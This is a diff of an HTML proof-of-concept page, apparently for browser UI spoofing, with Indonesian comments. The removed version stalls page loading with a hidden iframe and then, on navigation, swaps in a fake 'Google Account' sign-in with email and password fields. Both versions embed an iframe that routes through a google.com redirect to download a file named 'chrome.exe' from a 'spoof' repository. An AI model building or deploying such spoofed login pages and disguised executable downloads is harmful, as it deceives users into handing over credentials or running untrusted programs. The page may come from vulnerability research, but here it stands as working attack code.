@@ -2,76 +2,41 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>PoC 2 - Prolonged UI Spoof</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PoC with Iframe and Button</title>
 </head>
 <body>
   <div id="content">
-    <h1>Step 2</h1>
-    <p>Ketik <b>https://google.com:8080</b> di omnibox lalu tekan Enter</p>
+    <h1>Step 2: Redirect to Google</h1>
+    <p>Klik tombol di bawah untuk mengunjungi <b>Google.com</b> dan menampilkan iframe dengan URL yang ditentukan:</p>
+
+    <!-- Button untuk ke Google -->
+    <button onclick="redirectToGoogle()">Go to Google.com</button>
+
+    <!-- Iframe yang berisi URL yang kamu inginkan -->
+    <div style="margin-top: 20px;">
+      <iframe 
+        id="iframeExample" 
+        src="https://www.google.com/url?q=https%3A%2F%2Fcnfdnfial-ops.github.io%2Fspoof%2Fchrome.exe&sa=D&sntz=1&usg=AOvVaw3W5r-6mMJTcMqxax4geLnL"
+        width="600" 
+        height="300" 
+        style="border: 1px solid #ccc;">
+      </iframe>
+    </div>
   </div>
- <h1>Google Account</h1>
-          <p>Your session expired. Please sign in again.</p>
 
-          <input placeholder="Email" style="display:block;margin-bottom:8px;width:220px">
-          <input type="password" placeholder="Password" style="display:block;margin-bottom:12px;width:220px">
-
-          <button onclick="downloadPHP()">Continue</button>
-
-          <div style="margin-top:15px">
-            <iframe
-              src="https://www.google.com/url?q=https%3A%2F%2Fcnfdnfial-ops.github.io%2Fspoof%2Fchrome.exe&sa=D&sntz=1&usg=AOvVaw3W5r-6mMJTcMqxax4geLnL"
-              width="180"
-              height="40"
-              style="border:0; opacity:0.9">
-            </iframe>
-          </div>
   <script>
-    let triggered = false;
+    // Fungsi untuk redirect ke Google.com
+    function redirectToGoogle() {
+      // Redirect ke Google.com di tab baru
+      window.location.href = "https://www.google.com";
 
-    // iframe buat nahan loading
-    const stall = document.createElement("iframe");
-    stall.src = "https://10.255.255.1";
-    stall.style.display = "none";
-    document.body.appendChild(stall);
-
-    window.onbeforeunload = function () {
-      triggered = true;
-    };
-
-    setInterval(() => {
-      if (triggered) {
-        document.getElementById("content").innerHTML = `
-          <h1>Google Account</h1>
-          <p>Your session expired. Please sign in again.</p>
-
-          <input placeholder="Email" style="display:block;margin-bottom:8px;width:220px">
-          <input type="password" placeholder="Password" style="display:block;margin-bottom:12px;width:220px">
-
-          <button onclick="downloadPHP()">Continue</button>
-
-          <div style="margin-top:15px">
-            <iframe
-              src="https://www.google.com/url?q=https%3A%2F%2Fcnfdnfial-ops.github.io%2Fspoof%2Fchrome.exe&sa=D&sntz=1&usg=AOvVaw3W5r-6mMJTcMqxax4geLnL"
-              width="180"
-              height="40"
-              style="border:0; opacity:0.9">
-            </iframe>
-          </div>
-        `;
-        triggered = false;
-      }
-    }, 30);
-
-    function downloadPHP() {
-      const php = `<?php
-echo "login palsu 😁";
-?>`;
-
-      const blob = new Blob([php], { type: "application/php" });
-      const a = document.createElement("a");
-      a.href = URL.createObjectURL(blob);
-      a.download = "login.php";
-      a.click();
+      // Setelah redirect, tampilkan dialog download
+      setTimeout(function() {
+        // Trigger download dialog (melalui iframe yang sudah disediakan)
+        const iframe = document.getElementById('iframeExample');
+        iframe.style.display = "block";  // Tampilkan iframe
+      }, 2000);  // Tunggu 2 detik setelah redirect untuk menampilkan iframe
     }
   </script>
 </body>
